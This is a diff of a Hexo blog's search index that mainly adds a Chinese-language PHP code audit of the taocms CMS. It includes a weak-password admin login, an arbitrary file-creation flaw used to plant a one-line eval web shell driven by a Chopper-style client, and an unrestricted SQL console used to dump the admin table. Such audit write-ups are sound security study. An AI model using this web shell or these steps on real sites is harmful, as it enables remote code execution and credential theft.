@@ -10,25 +10,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/rustymoon/2023/10/28/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<span id="more"></span>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>PHP_SSRF</title>
     <url>/rustymoon/2023/11/13/PHP-SSRF/</url>
     <content><![CDATA[<p>SSRF–服务端请求伪造</p>
@@ -69,9 +50,28 @@
       </tags>
   </entry>
   <entry>
+    <title>Hello World</title>
+    <url>/rustymoon/2023/10/28/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<span id="more"></span>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>taocms-审计中</title>
     <url>/rustymoon/2023/11/14/taocms-%E5%AE%A1%E8%AE%A1%E4%B8%AD/</url>
-    <content><![CDATA[<p>因为ctf题目被暂时打入冷宫加上这个机会白要白不要，所以开始搞php代码审计</p>
+    <content><![CDATA[<p>因为ctf题目被暂时打入冷宫加上这个机会白要白不要，所以开始搞php代码审计<br>（一些代码注释都写代码块里面了）</p>
 <span id="more"></span>
 
 
@@ -88,6 +88,8 @@
 </ul>
 <img src="/rustymoon/2023/11/14/taocms-%E5%AE%A1%E8%AE%A1%E4%B8%AD/taocms1.png" class title="taocms安装完成">
 <p>看到这个界面就安装成功了。</p>
+<img src="/rustymoon/2023/11/14/taocms-%E5%AE%A1%E8%AE%A1%E4%B8%AD/taocmsinit.png" class title="管理员登入界面">
+
 <p>浅浅扫描一下：</p>
 <img src="/rustymoon/2023/11/14/taocms-%E5%AE%A1%E8%AE%A1%E4%B8%AD/taocms%E6%BC%8F%E6%B4%9E.png" class title="taocms漏洞">
 
@@ -194,11 +196,12 @@
 </blockquote>
 <hr>
 <hr>
-<h2 id="Model"><a href="#Model" class="headerlink" title="Model&#x2F;"></a>Model&#x2F;</h2><p>前面那张扫描图，可以看到开工的方向。<br>再发一遍：</p>
+<h1 id="Model"><a href="#Model" class="headerlink" title="Model&#x2F;"></a>Model&#x2F;</h1><p>前面那张扫描图，可以看到开工的方向。<br>再发一遍：</p>
 <img src="/rustymoon/2023/11/14/taocms-%E5%AE%A1%E8%AE%A1%E4%B8%AD/taocms%E6%BC%8F%E6%B4%9E.png" class title="taocms漏洞">
 
 
-<blockquote>
+<p>由于这个管理员初始名字和密码太简单，弱口令就可以进入后台。</p>
+<h2 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h2><blockquote>
 <p>file_get_contents()</p>
 </blockquote>
 <table>
@@ -231,7 +234,7 @@
 </tr>
 </tbody></table>
 <hr>
-<p>因为<code>file_get_contents()</code>没有回显，所以要有echo,查看代码其实可以看到有一个</p>
+<h3 id="upload"><a href="#upload" class="headerlink" title="upload?"></a>upload?</h3><p>因为<code>file_get_contents()</code>没有回显，所以要有echo,查看代码其实可以看到有一个</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//file.php</span>
 <span class="token keyword">function</span> <span class="token function-definition function">download</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 		<span class="token variable">$info</span><span class="token operator">=</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -240,18 +243,157 @@
 	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>那么寻找参数是否可控。</p>
 <p>因为用的是vscode，所以用查找功能，在本php文件里找<code>realpath</code>这个参数，在开头这段代码里面找到：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//file.php</span>
+<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span><span class="token operator">=</span><span class="token variable">$table</span><span class="token punctuation">;</span>
 		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">realpath</span><span class="token operator">=</span><span class="token constant">SYS_ROOT</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span><span class="token punctuation">;</span>
 		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tpl</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Template</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这段很好理解，在第三个<code>$this</code>找到<code>realpath</code>，其值由<code>path</code>拼接，同时，抬眼就能看到<code>path</code>都值是来自于请求的。</p>
 <p>也就是说，参数可控。这个可控的参数就是<code>path</code>。</p>
 <hr>
+<p>在管理界面到处找找，于是找到<code>上传</code>这个东西，打开:</p>
+<img src="/rustymoon/2023/11/14/taocms-%E5%AE%A1%E8%AE%A1%E4%B8%AD/%E4%B8%8A%E4%BC%A0%E7%95%8C%E9%9D%A2.png" class title="上传界面">
+<p>再回去到file.php中寻找相关代码：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//file.php</span>
+<span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;form action="admin.php" method="post" id="toolform" enctype="multipart/form-data"> 
+&lt;b>选择文件：&lt;/b>  
+ &lt;input name="uploadfile" type="file" id="uploadfile" />
+ &lt;input type="hidden" name="action" value="file" />
+	&lt;input type="hidden" name="ctrl" value="executeupload" />
+	&lt;input type="hidden" name="path" value="'</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span><span class="token operator">.</span><span class="token string single-quoted-string">'" />
+ &lt;input type="submit" name="button" id="button" value="上传" />
+&lt;/form>'</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">function</span> <span class="token function-definition function">executeupload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$baseUrl</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+		<span class="token variable">$upload</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//前面提过，php类的首字母都是大写的，所以这是一个来自其他php文件的类</span>
+		<span class="token variable">$state</span><span class="token operator">=</span><span class="token variable">$upload</span><span class="token operator">-></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uploadfile'</span><span class="token punctuation">,</span><span class="token variable">$baseUrl</span><span class="token punctuation">,</span><span class="token constant">WEBURL</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$state</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'err'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+			<span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">execmsg</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'上传失败，错误为：'</span><span class="token operator">.</span><span class="token variable">$state</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'err'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span><span class="token keyword">else</span>
+		<span class="token punctuation">&#123;</span>
+			<span class="token keyword">echo</span><span class="token string single-quoted-string">'&lt;script>window.opener.document.location.href="admin.php?action=file&amp;ctrl=lists&amp;path='</span><span class="token operator">.</span><span class="token variable">$baseUrl</span><span class="token operator">.</span><span class="token string single-quoted-string">'";window.close();&lt;/script>'</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>用php文件测试一下</p>
+<img src="/rustymoon/2023/11/14/taocms-%E5%AE%A1%E8%AE%A1%E4%B8%AD/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%99%BD%E5%90%8D%E5%8D%95.png" class title="文件上传白名单">
+
+<p>可以看到是采用白名单机制。</p>
+<p>这个跳转得有点快，不过其实打开拥有<code>Upload()</code>类的<code>Upload.php</code>即可查看白名单</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//Upload.php 部分代码</span>
+<span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span><span class="token variable">$inputname</span><span class="token punctuation">,</span><span class="token variable">$attachdir</span><span class="token operator">=</span><span class="token string single-quoted-string">'pictures/'</span><span class="token punctuation">,</span><span class="token variable">$urldir</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$dirtype</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$maxattachsize</span><span class="token operator">=</span><span class="token number">10097152</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token variable">$upext</span><span class="token operator">=</span><span class="token string single-quoted-string">'txt,rar,zip,jpg,jpeg,gif,png,swf,wmv,avi,wma,mp3,mid,jar,jad,exe,html,htm,css,js,doc'</span><span class="token punctuation">;</span><span class="token comment">//上传扩展名</span>
+		<span class="token variable">$err</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+		<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+		<span class="token variable">$upfile</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$inputname</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//获取上传文件</span>
+		<span class="token variable">$fileinfo</span><span class="token operator">=</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$upfile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//用pathinfo()函数获取后缀名，pathinfo()无法绕过。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><font size="1">于是尝试一下<em>修改后缀名+.htaccess</em>的方法，不过搞一半被自己蠢笑了，都白名单了还上传<code>.htaccess</code>，不如洗洗睡了。</font></p>
+<h4 id="pathinfo"><a href="#pathinfo" class="headerlink" title="pathinfo()"></a>pathinfo()</h4><p>name &#x3D; example.jpg<br>pathinfo($upfile[‘name’]);<br>返回数组：</p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Array
+(
+    [dirname] => .
+    [basename] => example.jpg
+    [extension] => jpg
+    [filename] => example
+)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>name &#x3D; example.php.png<br>pathinfo($upfile[‘name’]);<br>返回数组：</p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Array
+(
+    [dirname] => .
+    [basename] => test.php.png
+    [extension] => png
+    [filename] => test.php
+)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><code>dirname</code> 是文件所在的目录。如果文件名中没有目录信息，那么 dirname 就是当前目录，表示为 “.”。</li>
+<li><code>basename</code> 是包含扩展名的完整文件名。</li>
+<li><code>extension</code> 是文件的扩展名。</li>
+<li><code>filename</code> 是不包含扩展名的文件名。</li>
+</ul>
+<p>所以这个函数不好绕过。</p>
 <hr>
-<img src="/rustymoon/2023/11/14/taocms-%E5%AE%A1%E8%AE%A1%E4%B8%AD/taocmsinit.png" class title="管理员登入界面">]]></content>
+<h3 id="create"><a href="#create" class="headerlink" title="create?"></a>create?</h3><p>换个，来到<em>新建文件&#x2F;文件夹</em>这里，随便试试，发现还可以对新建的 文件&#x2F;文件夹 进行修改、删除。</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//file.php</span>
+
+<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span><span class="token operator">=</span><span class="token variable">$table</span><span class="token punctuation">;</span>
+		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">realpath</span><span class="token operator">=</span><span class="token constant">SYS_ROOT</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span><span class="token punctuation">;</span>
+		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tpl</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Template</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">//...</span>
+
+<span class="token keyword">function</span> <span class="token function-definition function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+			<span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">showmessage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'请填写文件名/文件夹名'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//可以直接点击新建试试——这个实现的就是没有得到输入的name的值的时候报错。</span>
+		<span class="token punctuation">&#125;</span>
+
+		<span class="token comment">//这里有趣的是，没有对新建的目录或者文件有任何限制，也就是，可以任意文件后缀。绕过了那个白名单——白名单vain</span>
+		<span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">realpath</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//构造了新文件或目录的完整路径，它是当前路径 $this->realpath 和 $_GET['name'] 拼接而成的</span>
+		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isdir'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+			<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">'目录'</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+			<span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">'文件'</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+
+
+		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_writable</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">showmessage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'新建'</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">'失败'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+		<span class="token comment">//这两行代码首先获取新创建的文件或目录的路径信息，然后显示一个消息提示用户新建文件或目录成功，并附带一个链接，该链接指向新创建的文件或目录所在的目录的文件列表页面。这一点有点完美符合文件上传攻击典型模板了。</span>
+		<span class="token variable">$info</span><span class="token operator">=</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">path</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">showmessage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'新建'</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token string single-quoted-string">'成功'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'admin.php?action=file&amp;ctrl=lists&amp;path='</span><span class="token operator">.</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dirname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>所以建了一个<code>ice.php</code>，写入<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code>，上面有个提示当前文件地址be like</p>
+<img src="/rustymoon/2023/11/14/taocms-%E5%AE%A1%E8%AE%A1%E4%B8%AD/ice.png" class title="ice.php界面">
+
+<p>然后用菜刀之类的工具，URL填的就是<code>http://taocms/ice.php</code>,密码填 cmd ，ok，连上。</p>
+<p>如果直接访问<code>http://taocms/ice.php</code>其实什么也看不到，稍微修改一下<code>ice.php</code>里面写入的内容就可以实现其他的操作了。</p>
+<hr>
+<h3 id="SQL？"><a href="#SQL？" class="headerlink" title="SQL？"></a>SQL？</h3><p>管理员界面还有一个比较显眼的<code>执行SQL</code>，所以又去看<code>sql.php</code>:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">excute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+	<span class="token comment">//传入的SQL语句作为sqltext的值</span>
+	<span class="token variable">$creatTable</span><span class="token operator">=</span><span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">magic2word</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sqltext'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$db</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Dbclass</span><span class="token punctuation">(</span><span class="token constant">SYS_ROOT</span><span class="token operator">.</span><span class="token constant">DB_NAME</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token comment">//用query执行传入的SQL语句</span>
+	<span class="token variable">$o</span><span class="token operator">=</span><span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$creatTable</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">echo</span><span class="token string single-quoted-string">'&lt;pre>'</span><span class="token punctuation">;</span>
+
+	<span class="token comment">//执行结果打印</span>
+	<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token class-name static-context">Base</span><span class="token operator">::</span><span class="token function">execmsg</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'执行SQL'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'?action=sql&amp;ctrl=display'</span><span class="token punctuation">,</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>没有对执行的SQL语句有什么限制</p>
+<hr>
+<p><b><i>TEST</i></b>：</p>
+<ul>
+<li>1.<code>show tables;</code></li>
+</ul>
+<img src="/rustymoon/2023/11/14/taocms-%E5%AE%A1%E8%AE%A1%E4%B8%AD/showtables.png" class title="show tables">
+
+<p>可以得知：<br>1.database name &#x3D; <code>taocms</code><br>2.表名是<code>cms_admin</code></p>
+<ul>
+<li>2.<code>select * from cms_admin;</code></li>
+</ul>
+<img src="/rustymoon/2023/11/14/taocms-%E5%AE%A1%E8%AE%A1%E4%B8%AD/showcolumns.png" class title="show columns">
+
+<p>这里有趣的是，在 用户修改 这个模块里看不到的管理员密码就这么找到了。要说有什么用，目前我也没看出来。</p>
+<hr>
+<hr>
+<p>有个添加用户的，也许会有越权？</p>
+]]></content>
       <tags>
         <tag>PHP</tag>
         <tag>代码审计</tag>
